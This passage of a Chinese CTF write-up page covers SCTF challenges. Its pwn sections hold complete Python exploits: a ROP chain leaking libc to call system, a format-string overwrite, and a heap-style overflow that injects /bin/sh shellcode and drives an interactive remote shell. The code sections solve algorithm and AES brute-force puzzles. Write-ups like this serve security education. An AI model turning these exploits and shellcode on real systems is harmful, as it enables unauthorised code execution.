  if len(sys.argv) == 3:
    sock_host = sys.argv[1]
    sock_port = int(sys.argv[2])

 

  S.connect((sock_host, sock_port))


  a = raw_input('pause')
  print S.recv(1024)

 

  send('syclover\x001111111\xf0')

  print S.recv(1024)


  ebp = '\x20\x99\x04\x08'
  libc = '\x5c\x98\x04\x08' #__libc_start_main
  retaddr1 = '\xa0\x83\x04\x08' # write
  retaddr2 = '\xbe\x85\x04\x08' #pop;pop;pop;ret
  pop_ebp_ret = '\xc0\x85\x04\x08'
  retaddr3 = '\x60\x83\x04\x08' # read
  retaddr4 = '\xd2\x85\x04\x08' #leave ret



   send('A'*0x9c + ebp + retaddr1 + retaddr2 + '\x01\x00\x00\x00' + libc +  '\x04\x00\x00\x00' +pop_ebp_ret + ebp + retaddr3 + retaddr4 +  '\x00\x00\x00\x00' + '\x24\x99\x04\x08' + '\xf0\x00\x00\x00' )

  time.sleep(1)
  l = S.recv(1024)

 

  libcaddr = struct.unpack('I', l)[0]
  print '__libc_start_main:',hex(libcaddr)
  system = libcaddr + 0x26050

 

  send(struct.pack('I', system) + 'AAAA'+'\x30\x99\x04\x08' + '/bin/sh\x00')

 

  get_shell()

 

if __name__ == '__main__':

  main()</pre>
<p>&nbsp;</p>
<h2>Pwn300</h2>
<div id="cha_content">nc 218.2.197.248 10002<br />
have fun~<br />
Hint: /home/pwn2/flag<br />
<a href="http://download.sycsec.com/pwn/2953c7ebbb9d5b294c6b83f31b8050ce.zip" target="_blank">Download</a></div>
<div id="cha_score">Score: 300</div>
<div id="cha_ratio">Ratio: 27/659</div>
<div id="cha_remain">Remain: 0/30</div>
<div></div>
<div>
<p>在print message里有个格式化字符串漏洞，同时有个把字符串copy到栈里有利于利用。<a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_49.png"><img class="alignnone size-full wp-image-3042" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_49.png" alt="sctf_writeup_49" width="541" height="124" /></a></p>
<p>Exp如下</p>
<pre class="lang:python decode:true ">#coding:utf-8

__author__ = 'Dazdingo'

 

from socket import *

import struct

import time

import threading

import sys

 

is_recv = True

 

sock_host = '192.168.206.130'

sock_port = 8080

 

S = socket(AF_INET, SOCK_STREAM)

 

def send(ss, tail = '', r = False):

  global S

  if tail:

    ss += tail

  print ss

  S.send(ss)

  if r:

    print S.recv(1024)

 

def recv_until(str):

  data = S.recv(1024)

  e = data.find(str)

  while 1:

    if e == -1:

      data = S.recv(1025)

      e = data.find(str)

    else:

      break

 

  return data, e

 

def outputrecv():

  global S

  while 1:

    if is_recv:

      i =  S.recv(1024)

      if i:

        sys.stdout.write(i)

 

def start_recv():

  #start recv

  t = threading.Thread(target = outputrecv,  args = ())

  t.daemon = True

  t.start()

 

def get_shell():

  #start recv

  start_recv()

 

  global S

  while 1:

    time.sleep(0.1)

    ss = raw_input() + '\n'

    S.send(ss)

 

 

def main():

  global S

 

  if len(sys.argv) == 3:

    sock_host = sys.argv[1]

    sock_port = int(sys.argv[2])

 

  S.connect((sock_host, sock_port))

 

  a = raw_input('pause')

  print S.recv(1024)

 

  send('2\n', r = 1)

  send('%279$x\n', r = 1)

  send('3\n')

 

  data, e = recv_until('message is:')

  print data, e

  leak_memory = int(data[e+11:e+19], 16)

 

  send('2\n', r = 1)

  send('%266$x\n', r = 1)

  send('3\n')

 

  data, e = recv_until('message is:')

  print data, e

  ebp = int(data[e+11:e+19], 16)

 

  call_system = leak_memory + 0x25E24

 

  s = hex(call_system)

  print 'call_system, ebp is', s, hex(ebp)

 

  ret_add1  = struct.pack('I', ebp-0x2c)

  ret_add2  = struct.pack('I', ebp-0x2a)

  arg0 = struct.pack('I', ebp-0x24)

  arg1 = struct.pack('I', ebp-0x20)

 

  num_send1 = int(s[6:10], 16)

  num_send2 = int(s[2:6], 16) - num_send1

 

  send('2\n', r = 1)

   send('%16$n%17$n%'+ str(num_send1) + 'x%18$n%' + str(num_send2) +  'x%19$n' + '\x20'*(12-len(str(num_send1))-len(str(num_send2))) + arg0 +  arg1 +ret_add1 +ret_add2 + '\n', r = 1)

  send('3\n', r = 1)

 

  get_shell()

 

 

if __name__ == '__main__':

  main()</pre>
<p>&nbsp;</p>
<h2>Pwn400</h2>
<div id="cha_content">nc 218.2.197.248 10003<br />
hint:/home/pwn3/flag/flag<br />
<a href="http://download.sycsec.com/pwn/3672fd72c006be0e28bafc124b1e71f7.zip" target="_blank">Download</a></div>
<div id="cha_score">Score: 400</div>
<div id="cha_ratio">Ratio: 14/659</div>
<div id="cha_remain">Remain: 0/30</div>
<div></div>
<div></div>
<div>
<p>node之间通过双向链表连接起来，show node可以回显node在内存中的地址，edite node可以过界修改一个node的content，从而覆盖next node的头部。类似于堆溢出的利用。程序没有nx，可直接执行shellcode。</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_50.png"><img class="alignnone size-full wp-image-3045" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_50.png" alt="sctf_writeup_50" width="864" height="43" /></a></p>
<p>Exp如下</p>
<pre class="lang:python decode:true ">#coding:utf-8

 

from socket import *

import struct

import time

import threading

import sys

 

is_recv = True

 

sock_host = '192.168.206.130'

sock_port = 8080

 

S = socket(AF_INET, SOCK_STREAM)

 

def send(ss, tail = '', recv = False):

  global S

  if tail:

    ss += tail

  print ss

  S.send(ss)

  if recv:

    print S.recv(1024)

 

def outputrecv():

  global S

  while 1:

    if is_recv:

      i =  S.recv(1024)

      if i:

        sys.stdout.write(i)

 

def start_recv():

  #start recv

  t = threading.Thread(target = outputrecv,  args = ())

  t.daemon = True

  t.start()

 

def get_shell():

  #start recv

  start_recv()

 

  global S

  while 1:

    time.sleep(0.1)

    ss = raw_input() + '\n'

    S.send(ss)

 

 

def main():

  global S

 

  if len(sys.argv) == 3:

    sock_host = sys.argv[1]

    sock_port = int(sys.argv[2])

 

  S.connect((sock_host, sock_port))

 

  a = raw_input('pause')

  print S.recv(1024)

 

  #first node

  send('1', recv = True)

  send('111', recv = True)

  send('111', recv = True)

  send('111', recv = True)

  print S.recv(1024)

 

  #second node

  send('1', recv = True)

  send('222', recv = True)

  send('222', recv = True)

  send('222', recv = True)

  print S.recv(1024)

 

  #third node

  send('1', recv = True)

  send('333', recv = True)

  send('333', recv = True)

  send('333', recv = True)

  time.sleep(1)

  print S.recv(1024)

 

  #record first node pointer

  send('3', recv = True)

  send('111')

  data = S.recv(1024)

  print data

  e = data.find('location:')

  while 1:

    if e == -1:

      data = S.recv(1024)

      e = data.find('location:')

    else:

      break

  print e, data[e+9:e+19]

  p_first_node = int(data[e+9:e+19], 16)

 

  #record second node pointer

  send('3', recv = True)

  send('222')

  data = S.recv(1024)

  print data

  e = data.find('location:')

  while 1:

    if e == -1:

      data = S.recv(1024)

      e = data.find('location:')

    else:

      break

  p_second_node = int(data[e+9:e+19], 16)

 

  print 'pointer of first,second node:', hex(p_first_node), hex(p_second_node)

 

  nops = '\x90'* (p_second_node - p_first_node - 108)

  jmp = '\xeb\x06\x90\x90\x90\x90\x90\x90'

  #exec /bin/sh - 43 bytes

  buf =  ""

  buf += "\xdd\xc2\xd9\x74\x24\xf4\x5b\x2b\xc9\xba\x39\x29\xde"

  buf += "\xee\xb1\x0b\x31\x53\x1a\x83\xc3\x04\x03\x53\x16\xe2"

  buf += "\xcc\x43\xd5\xb6\xb7\xc6\x8f\x2e\xea\x85\xc6\x48\x9c"

  buf += "\x66\xaa\xfe\x5c\x11\x63\x9d\x35\x8f\xf2\x82\x97\xa7"

  buf += "\x0d\x45\x17\x38\x21\x27\x7e\x56\x12\xd4\xe8\xa6\x3b"

  buf += "\x49\x61\x47\x0e\xed"

 

  shellcode = jmp+buf

 

  #edite first node

  send('4', recv = True)

  send('111', recv = True)

  send(nops + struct.pack('I', p_second_node) + '\x70\xa4\x04\x08' + struct.pack('I', p_second_node + 0xc) + shellcode) 

 

  #delete node

  send('5', recv = True)

  send(hex(p_second_node)[2:10], recv = True)

 

  get_shell()

 

if __name__ == '__main__':

  main()</pre>
<p>&nbsp;</p>
</div>
</div>
</div>
</div>
<h2> Code200</h2>
<div id="cha_content">在218.2.197.248:10007运行了一个ATM程序，但是这个ATM有一个特点，每次只能存 2^i（i为偶数）元或者取2^i(i为奇数)元，0&lt;=i&lt;99，且每个i只能使用一次。给出任意一定的金额（正数代表取出，负数代表存 进），怎样操作这个ATM才能满足给定的金额?<br />
eg:<br />
13<br />
4 3 2 0<br />
983<br />
10 5 3 1 0</div>
<div id="cha_score">Score: 200</div>
<div id="cha_ratio">Ratio: 59/659</div>
<div id="cha_remain">Remain: 0/30</div>
<div></div>
<div>
<p>题目的意思是：知道一个数，分解为若干(-2)^i的和，i是位数,求i的组合。如</p>
<p>eg1：</p>
<p>202</p>
<p>8 7 6 4 3 2 1</p>
<p>202=(-2)^8+(-2)^7+(-2)^6+(-2)^4+(-2)^3+(-2)^2+(-2)^1</p>
<p>=256-128+64+16-8+4-2</p>
<p>eg2：</p>
<p>515</p>
<p>10 9 2 1 0</p>
<p>515=(-2)^10+(-2)^9+(-2)^2+(-2)^1+(-2)^0</p>
<p>解法与10进制转2进制类似，不过要注意每位的正负不同</p>
<p>代码：</p>
<pre class="lang:python decode:true">from socket import *

 

HOST='218.2.197.248'

PORT=10007

 

s = socket(AF_INET, SOCK_STREAM)

s.connect((HOST,PORT))

while True:

         input=int(s.recv(1024),10)

         print input

 

         step=0

         ans=''

         list=[]

         while input:

                   if step%2==0:

                            flag=-1

                   else:

                            flag=1

                   if input%2==1:

                            input=input+flag

                            list.append(str(step))

                   #else:

                   input=input/2

                   step=step+1

         list.reverse()

         for i in list:

                  ans=ans+' '+ i

 

         print ans

         s.send(ans)

 

s.close()</pre>
<p>&nbsp;</p>
<h2>Code400</h2>
<div id="cha_content">哈喽~还记得上次有一群人帮Mallory窃取了Alice转给Bob的钱钱么~<br />
女神Alice为此伤心不已<br />
作为一个好人，plusplus7又决定帮Alice找回这笔钱<br />
机智的少年Mallory使用号称全宇宙最先进的黑科技把钱钱藏了起来，通过plusplus7的掐指一算，得到了一个奇怪的脚本...<br />
<a href="http://download.sycsec.com/code/code400/lock.py" target="_blank">look</a></div>
<div id="cha_score">Score: 400</div>
<div id="cha_ratio">Ratio: 25/659</div>
<div id="cha_remain">Remain: 0/30</div>
<div></div>
<div> 题目所给的原始代码如下：</div>
<div>
<pre class="lang:python decode:true ">import json
import hashlib
import os
import base64
from Crypto.Cipher import AES
 
 
fp = open("secret.json", "r")
secret = json.load(fp)
fp.close()
 
if type(secret["the answer to life the universe and everything"]) != type(u"77"):
    destroy_the_universe()
 
answer = hashlib.sha1(secret["the answer to life the universe and everything"]).hexdigest()[0:16]
key = hashlib.sha1(secret["Don't google what it is"]).digest()[0:6]
 
if ord(key[4])*(ord(key[5])-5) != 17557:
    destroy_the_universe()
 
keys = ["hey"+key[2]+"check"+key[3]+"it"+key[0]+"out", 
        "come"+key[1]+"on"+key[4]+"baby"+key[5]+"~~!"]
answer = AES.new(keys[1],AES.MODE_ECB).encrypt(
                AES.new(keys[0], AES.MODE_ECB).encrypt(answer))
 
if base64.b64encode(answer) == "fm2knkCBHPuhCQHYE3spag==":
    fp = open("%s.txt" % hashlib.sha256(key).hexdigest(), "w")
    fp.write(secret["The entrance to the new world"])
    fp.close()</pre>
<p>&nbsp;</p>
<p>第一个if语句也真是个坑，Google一下"the answer to life the universe and everything"得到的是42，然后后面也必须用42，不然就算不出结果，这里居然写成77？</p>
<p>第二个if语句，我们可以计算出有97*181=17557，代码如下：</p>
<p>def break_multiply(dst=17557): for i in xrange(0, dst+1): for j in xrange(i, dst+1): if i * j == dst: print "%d * %d = %d" % (i, j, dst)</p>
<p>那么key<a href="http://drops.wooyun.org/wp-content/uploads/2014/12/file00023.png">4</a>和key<a href="http://drops.wooyun.org/wp-content/uploads/2014/12/file00032.png">5</a>会存在两种情况(97,186)，(181,102)。</p>
<p>之后就是加密处理了，加密逻辑为：使用keys[0]对answer进行AES加密得到中间结果TMP，然后使用keys<a href="http://drops.wooyun.org/wp-content/uploads/2014/12/file00012.png">1</a>对TMP进行AES加密得到结果RES，对RES进行Base64编码得到fm2knkCBHPuhCQHYE3spag==。</p>
<p>那么我们就可以开始爆破了，其中keys<a href="http://drops.wooyun.org/wp-content/uploads/2014/12/file00012.png">1</a>存在512种情况，所以稍微优化一下我们可以使用keys<a href="http://drops.wooyun.org/wp-content/uploads/2014/12/file00012.png">1</a>对加密结果进行AES解密，然后使用一个list保存这512种可能的中间结果，然后跑一个256<em>256</em>256的三重循环破解keys[0]，代码如下：</p>
<pre class="lang:python decode:true "># -*- coding:utf-8 -*-
 
import hashlib
import base64
from Crypto.Cipher import AES
 
def genkey1():
    res = []
    for i in xrange(0, 256):
        res.append("come"+chr(i)+"on"+chr(181)+
                     "baby"+chr(102)+"~~!")
        res.append("come"+chr(i)+"on"+chr(97)+
                     "baby"+chr(186)+"~~!")
    return res
 
def genkey0():
    res = []
    for i in xrange(0, 256):
        for j in xrange(0, 256):
            for k in xrange(0, 256):
                res.append("hey"+chr(i)+"check"+
                             chr(j)+"it"+chr(k)+"out")
    return res
 
def getkey1(key0):
    answer = hashlib.sha1(u"42").hexdigest()[0:16]
    tmp = AES.new(key0, AES.MODE_ECB).encrypt(answer)
    final_answer = base64.b64decode("fm2knkCBHPuhCQHYE3spag==")
    for i in xrange(0, 256):
        key1 = "come"+chr(i)+"on"+chr(181)+"baby"+chr(102)+"~~!"
        if tmp == AES.new(key1, AES.MODE_ECB).decrypt(
                             final_answer):
            print "key1: " + repr(key1)
            return
        key1 = "come"+chr(i)+"on"+chr(97)+"baby"+chr(186)+"~~!"
        if tmp == AES.new(key1, AES.MODE_ECB).decrypt(
                             final_answer):
            print "key1: " + repr(key1)
            return
 
def crack():
    keys0 = genkey0() # 256**3
    keys1 = genkey1() # 512
    answer = hashlib.sha1(u"42").hexdigest()[0:16]
    final_answer = base64.b64decode("fm2knkCBHPuhCQHYE3spag==")
    tmp_res = []
    for key1 in keys1:
        tmp_res.append(AES.new(key1, AES.MODE_ECB).decrypt(
                          final_answer))
    for key0 in keys0:
        tmp = AES.new(key0, AES.MODE_ECB).encrypt(answer)
        if tmp in tmp_res:
            print "key0: " + repr(key0)
            return getkey1(key0)
 
if __name__ == "__main__":
    crack()
    key = "\x81i7\x88a\xba"
    print hashlib.sha256(key).hexdigest()
"""
key0: 'hey7check\x88it\x81out'  2 3 0
key1: 'comeionababy\xba~~!'     1 4 5
5bd15779b922c19ef9a9ba2f112df1f2dbb0ad08bbf9edac27a28a0f3ba753f4
 
http://download.sycsec.com/code/code400/5bd15779b922c19ef9a9ba2f112df1f2dbb0ad08bbf9edac27a28a0f3ba753f4.txt
 
"""</pre>
<p>&nbsp;</p>
<p>当然上面的代码中也可以不事先执行完3个256的循环，这样还可以进一步加快计算速度，因为中间只要得到答案就可以返回了。这里得到的key为"\x81i7\x88a\xba"，sha256得到5bd15779b922c19ef9a9ba2f112df1f2dbb0ad08bbf9edac27a28a0f3ba753f4。所以打开</p>
<p>http://download.sycsec.com/code/code400/5bd15779b922c19ef9a9ba2f112df1f2dbb0ad08bbf9edac27a28a0f3ba753f4.txt</p>
<p>打开得到如下的提示：</p>
<pre><code>====== Base64格式密文 ======
Or18/xSC2xW5pT7BLbIE7YPGLwWytbZsxupMp4w6iaa0QvtYZUMefkf43wmzR36MekHm23wgI4buIJLGk7m7gTq9fP8UgtsVuaU+wS2yBO2Dxi8FsrW2bMbqTKeMOommtEL7WGVDHn5H+N8Js0d+jHpB5tt8ICOG7iCSxpO5u4E6vXz/FILbFbmlPsEtsgTtg8YvBbK1tmzG6kynjDqJprRC+1hlQx5+R/jfCbNHfox6QebbfCAjhu4gksaTubuBOr18/xSC2xW5pT7BLbIE7YPGLwWytbZsxupMp4w6iaa0QvtYZUMefkf43wmzR36MekHm23wgI4buIJLGk7m7gTq9fP8UgtsVuaU+wS2yBO2Dxi8FsrW2bMbqTKeMOommtEL7WGVDHn5H+N8Js0d+jHpB5tt8ICOG7iCSxpO5u4E=
====== 部分明文还原 ======
*****n**M****H***j***Wx*******d************h*****3****=*******==******t**F**M**f***hM************3***H*w**J*********=**==*******U******E**95**V*c*N****5**t*M*****J*c*Q*****c*h5**0******==*==****NUR*******************X2*u*H**Y************G**P****=***********0*****************************f***5****OX*********=*******=****
</code></pre>
<p>对Base64密文进行Base64解码，发现密文的长度为320，和明文的长度是一致的，然后密文是下面的值重复5次：</p>
<pre><code>:\xbd|\xff\x14\x82\xdb\x15\xb9\xa5&gt;\xc1-\xb2\x04\xed\x83\xc6/\x05\xb2\xb5\xb6l\xc6\xeaL\xa7\x8c:\x89\xa6\xb4B\xfbXeC\x1e~G\xf8\xdf\t\xb3G~\x8czA\xe6\xdb| #\x86\xee \x92\xc6\x93\xb9\xbb\x81
</code></pre>
<p>密文和明文长度是一致的，然后密文是重复的，可以猜想明文也是重复的，而且明文去除掩码后得到的字符串的长度刚好是64（64*5=320）：</p>
<p>nMHjWxdh3===tFMfhM3HwJ===UE95VcN5tMJcQch50====NURX2uHYGP=0f5OX==</p>
<p>所以猜想通过带掩码的明文刚好可以恢复出明文值，代码如下：</p>
<pre class="lang:python decode:true "># -*- coding:utf-8 -*-
import sys
import hashlib
import base64
 
def crack():
    ciphertext = base64.b64decode("Or18/xSC2xW5pT7BLbIE7YPGLwWytbZsxupMp4w6iaa0QvtYZUMefkf43wmzR36MekHm23wgI4buIJLGk7m7gTq9fP8UgtsVuaU+wS2yBO2Dxi8FsrW2bMbqTKeMOommtEL7WGVDHn5H+N8Js0d+jHpB5tt8ICOG7iCSxpO5u4E6vXz/FILbFbmlPsEtsgTtg8YvBbK1tmzG6kynjDqJprRC+1hlQx5+R/jfCbNHfox6QebbfCAjhu4gksaTubuBOr18/xSC2xW5pT7BLbIE7YPGLwWytbZsxupMp4w6iaa0QvtYZUMefkf43wmzR36MekHm23wgI4buIJLGk7m7gTq9fP8UgtsVuaU+wS2yBO2Dxi8FsrW2bMbqTKeMOommtEL7WGVDHn5H+N8Js0d+jHpB5tt8ICOG7iCSxpO5u4E=")
    plaintext = "*****n**M****H***j***Wx*******d************h*****3****=*******==******t**F**M**f***hM************3***H*w**J*********=**==*******U******E**95**V*c*N****5**t*M*****J*c*Q*****c*h5**0******==*==****NUR*******************X2*u*H**Y************G**P****=***********0*****************************f***5****OX*********=*******=****"
    print repr(ciphertext)
    length = len(ciphertext) / 5
    answer = list("*"*length)
    for i in xrange(0, len(plaintext)):
        if plaintext[i] != '*':
            answer[i%length] = plaintext[i]
    answer = "".join(answer)
    print answer
    print base64.b64decode(answer)
    # SCTF{D0_y0u_r3a1ly_kn0w_crypt09raphy?}
 
if __name__ == "__main__":
    crack()</pre>
<p>&nbsp;</p>
<p>解出来的明文为：</p>
<p>U0NURntEMF95MHVfcjNhMWx5X2tuMHdfY3J5cHQwOXJhcGh5P30=============</p>
<p>进行Base64解码得到Flag为。SCTF{D0_y0u_r3a1ly_kn0w_crypt09raphy?}</p>
</div>
<h2>Code500</h2>
<div></div>
<div>
<div id="cha_content">女神Alice找回了钱钱，女神非常开心，然后就去洗澡了<br />
这时Mallory已经逃走了！<br />
plusplus7希望抓住Mallory，于是决定开挖掘机去追他。<br />
刚刚坐上挖掘机，结果发现启动挖掘机需要把一些插头按照一定的顺序连接起来...<br />
插头有两面，每个插头的两端都有颜色<br />
如：<br />
绿色和黑色插头 “G:B”<br />
当插头的两个面颜色相同，才能被接在一起<br />
如：<br />
对接成功 “G:B = B:V”<br />
对接失败 “G:B * C:G”<br />
插座也有两面，一面有颜色，一面无颜色以"X"表示<br />
如：<br />
左插座 “X:B”<br />
右插座 “C:X”<br />
插座只有两个，且不可移动<br />
如：<br />
“X:B * C:G = G:E * B:C * E:X”<br />
对挖掘机的siri输入指令，“3 3 1”<br />
“X:B = B:C = C:G = G:E = E:X”<br />
那么，问题来了...<br />
218.2.197.248:7777</div>
<div id="cha_score">Score: 500</div>
<div id="cha_ratio">Ratio: 9/659</div>
<div id="cha_remain">Remain: 0/30</div>
<div></div>
<div>
<pre class="lang:python decode:true ">#!/usr/bin/env python
#encoding:utf-8
 
import socket
 
def get_one(s):
    try:
        ret = s.recv(100)
        while ret.find(":X\n") == -1 and ret.find("SCTF") == -1:
            ret += s.recv(100)
        print ret
        return ret[:-1]
    except Exception, e:
        print 'Fail', ret
        return ret
 
def check(now, size):
    for i in xrange(1, size):
        if now[i - 1][2] != now[i][0]:
            return False
    return True
 
def swap(now, i, j, k, deep):
    history[deep] = [i, j, k]
    if k &lt; i:
        return now[:k] + now[i:j + 1] + now[k:i] + now[j + 1:]
    elif k &gt; j:
        return now[:i] + now[j + 1:k] + now[i:j + 1] + now[k:]
    return now
 
def dfs(now, deep, max_deep, size):
    if deep == max_deep:
        if check(now, size):
            return True
        return False
    for i in xrange(1, size):
        if now[i - 1][2] != now[i][0]:
            for j in xrange(1, size):
                if now[i - 1][2] == now[j][0]:
                    start = j
                    break
            for j in xrange(0, size - 1):
                if now[i][0] == now[j][2]:
                    stop = j
                    break
            if start &lt;= stop and (start &gt; i or stop &lt; i - 1):
                return dfs(swap(now, start, stop, i, deep), deep + 1, max_deep, size)
    for i in xrange(1, size - 1):
        if now[i - 1][2] == now[i][0]:
            continue
        for j in xrange(i, size - 1):
            if now[j][2] == now[j + 1][0]:
                continue
            for k in xrange(1, i):
                if now[k - 1][2] != now[k][0] and dfs(swap(now, i, j, k, deep), deep + 1, max_deep, size):
                    return True
            for k in xrange(j + 2, size):
                if now[k - 1][2] != now[k][0] and dfs(swap(now, i, j, k, deep), deep + 1, max_deep, size):
                    return True
    return False
 
def get_answer(now, max_step):
    now = now.replace(' ', '').replace('=', '*').split('*')
    size = len(now)
    for i in xrange(1, max_step + 1):
        if dfs(now, 0, i, size):
            print history
            return i
 
history = [[] for i in range(10)]
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('218.2.197.248', 7777))
round_count = 1
ret = get_one(s)[len("Let's start this game!\n"):]
while True:
    step = get_answer(ret, 7)
    for i in xrange(step):
        s.send("%d %d %d" % (history[i][0], history[i][1], history[i][2]))
        ret = get_one(s)
    print 'Round', round_count, 'finsh.\n'
    round_count += 1
    ret = get_one(s)[len('Round pass...\n'):]
</pre>
<p>&nbsp;</p>
</div>
</div>
</div>
</div>
<p><br/><br/><br />
【本文来源<a href="http://bobao.360.cn/learning/detail/129.html" target="_blank">360bobao</a> Madimo和西安电子科技大学L战队提供 SP胖编编辑发布】</p>
		<div class="pageShenming">
【安全脉搏：分享技术、悦享品质。文章仅代表作者看法，如有不同观点，欢迎添加安全脉搏微信号：SecPulse，进行交流。】</div>
<div class="post-tags"><span>Tags: </span><a href="https://www.secpulse.com/archives/tag/challenge" rel="tag">challenge</a><a href="https://www.secpulse.com/archives/tag/file-sycsec-com" rel="tag">file.sycsec.com</a><a href="https://www.secpulse.com/archives/tag/foremost" rel="tag">foremost</a><a href="https://www.secpulse.com/archives/tag/halflmchall" rel="tag">halflmchall</a><a href="https://www.secpulse.com/archives/tag/happy_net163-com" rel="tag">happy_net@163.com</a><a href="https://www.secpulse.com/archives/tag/httpreport-man-sycsec-comlogin-php" rel="tag">http://report-man.sycsec.com/login.php</a><a href="https://www.secpulse.com/archives/tag/jjboom" rel="tag">JJBoom</a><a href="https://www.secpulse.com/archives/tag/john-ntlm-pl" rel="tag">john-ntlm.pl</a><a href="https://www.secpulse.com/archives/tag/jphide" rel="tag">jphide</a><a href="https://www.secpulse.com/archives/tag/laterain" rel="tag">LateRain</a><a href="https://www.secpulse.com/archives/tag/mdmp" rel="tag">MDMP</a><a href="https://www.secpulse.com/archives/tag/mimikatz" rel="tag">mimikatz</a><a href="https://www.secpulse.com/archives/tag/minecraft" rel="tag">minecraft</a><a href="https://www.secpulse.com/archives/tag/misc" rel="tag">Misc</a><a href="https://www.secpulse.com/archives/tag/misc10" rel="tag">Misc10</a><a href="https://www.secpulse.com/archives/tag/misc100" rel="tag">Misc100</a><a href="https://www.secpulse.com/archives/tag/misc200" rel="tag">MISC200</a><a href="https://www.secpulse.com/archives/tag/modx" rel="tag">modx</a><a href="https://www.secpulse.com/archives/tag/modx-sycsec-com" rel="tag">modx.sycsec.com</a><a href="https://www.secpulse.com/archives/tag/mp3stego" rel="tag">mp3stego</a><a href="https://www.secpulse.com/archives/tag/netlmis" rel="tag">NETLMIS</a><a href="https://www.secpulse.com/archives/tag/netlmis666" rel="tag">NetLMis666</a><a href="https://www.secpulse.com/archives/tag/rcracki_mt" rel="tag">rcracki_mt</a><a href="https://www.secpulse.com/archives/tag/report-man-sycsec-com" rel="tag">report-man.sycsec.com</a><a href="https://www.secpulse.com/archives/tag/sctf" rel="tag">SCTF</a><a href="https://www.secpulse.com/archives/tag/sctf-writeup" rel="tag">SCTF Writeup</a><a href="https://www.secpulse.com/archives/tag/sekurlsalogonpasswords-full" rel="tag">sekurlsa::logonPasswords full</a><a href="https://www.secpulse.com/archives/tag/sekurlsaminidump" rel="tag">sekurlsa::minidump</a><a href="https://www.secpulse.com/archives/tag/smb%e5%8a%ab%e6%8c%81%e6%94%bb%e5%87%bb" rel="tag">smb劫持攻击</a><a href="https://www.secpulse.com/archives/tag/smb%e5%8d%8f%e8%ae%ae" rel="tag">smb协议</a><a href="https://www.secpulse.com/archives/tag/stegdetect" rel="tag">stegdetect</a><a href="https://www.secpulse.com/archives/tag/syc071" rel="tag">SYC071</a><a href="https://www.secpulse.com/archives/tag/syc083" rel="tag">SYC083</a><a href="https://www.secpulse.com/archives/tag/writeup" rel="tag">writeup</a><a href="https://www.secpulse.com/archives/tag/xiaojingsycsec-com" rel="tag">xiaojing@sycsec.com</a><a href="https://www.secpulse.com/archives/tag/zip%e4%bc%aa%e5%8a%a0%e5%af%86" rel="tag">zip伪加密</a><a href="https://www.secpulse.com/archives/tag/%e4%ba%8c%e6%ac%a1%e5%85%83" rel="tag">二次元</a><a href="https://www.secpulse.com/archives/tag/code-audit" rel="tag">代码审计</a><a href="https://www.secpulse.com/archives/tag/%e5%86%85%e7%bd%91%e6%94%bb%e5%87%bb%e6%95%b0%e6%8d%ae%e5%8c%85%e5%88%86%e6%9e%90" rel="tag">内网攻击数据包分析</a><a href="https://www.secpulse.com/archives/tag/%e5%af%86%e9%92%a5" rel="tag">密钥</a><a href="https://www.secpulse.com/archives/tag/%e6%89%8b%e6%8c%81%e4%b8%a4%e6%8a%8a%e9%94%9f%e6%96%a4%e6%8b%b7%ef%bc%8c%e5%8f%a3%e4%b8%ad%e7%96%be%e5%91%bc%e7%83%ab%e7%83%ab%e7%83%ab" rel="tag">手持两把锟斤拷，口中疾呼烫烫烫</a><a href="https://www.secpulse.com/archives/tag/%e8%84%9a%e8%b8%8f%e5%8d%83%e6%9c%b5%e5%b1%af%e5%b1%af%e5%b1%af%ef%bc%8c%e7%ac%91%e7%9c%8b%e4%b8%87%e7%89%a9%e9%94%98%e9%94%98%e9%94%98" rel="tag">脚踏千朵屯屯屯，笑看万物锘锘锘</a><a href="https://www.secpulse.com/archives/tag/%e8%90%8c%e5%a6%b9%e5%ad%90" rel="tag">萌妹子</a><a href="https://www.secpulse.com/archives/tag/%e8%b4%aa%e5%90%83%e8%9b%87" rel="tag">贪吃蛇</a><a href="https://www.secpulse.com/archives/tag/%e9%9a%90%e5%86%99" rel="tag">隐写</a></div>
		</div>
	<!-- .single-content -->
		<div class="pageActive">
	<div class="mark-like-btn">
							</div>
	<!-- Baidu Button BEGIN -->
	<div class="bdshare">
		<div class="bdsharebuttonbox">
			<a href="#" class="bds_more" data-cmd="more"></a><a href="#"
				class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a><a href="#"
				class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a><a href="#"
				class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
		</div>
		<script>
		window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"32"},"share":{}};
		with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
		</script>

	</div>
</div>    <section id="text-6" class="widget-container widget_text hidden-xs">			<div class="textwidget"><center><a href="https://www.duoyinsu.com" target="_blank" title="安识科技 专业安全服务商"><img src="https://www.secpulse.com/wp-includes/images/secweixin.png" style="width:785px;height:315px"></a><center></div>
		</section><section id="related_post-2" class="widget-container widget_related_post hidden-xs"><h3 class="widget-title">相关文章</h3>

	<ul class="related_post">
				<li><a href="https://www.secpulse.com/archives/60244.html" title="详细阅读 2017 ISG 管理运维赛 官方Writeup">
		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=https://www.secpulse.com/wp-content/uploads/2017/09/ISG.jpg&h=150&w=249&zc=1" alt="2017 ISG 管理运维赛 官方Writeup" class="xg-img"/>
		<p>2017 ISG 管理运维赛 官方Wri&hellip;</P></a></li>
				<li><a href="https://www.secpulse.com/archives/59036.html" title="详细阅读 深度剖析Petya病毒：反社会人格的恶性病毒 只为破坏不为牟利">
		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=https://www.secpulse.com/wp-content/uploads/2017/06/Petya.jpg&h=150&w=249&zc=1" alt="深度剖析Petya病毒：反社会人格的恶性病毒 只为破坏不为牟利" class="xg-img"/>
		<p>深度剖析Petya病毒：反社会人格的恶性&hellip;</P></a></li>
				<li><a href="https://www.secpulse.com/archives/57936.html" title="详细阅读 首届DDCTF高校闯关赛，世界级安全专家等你来战！">
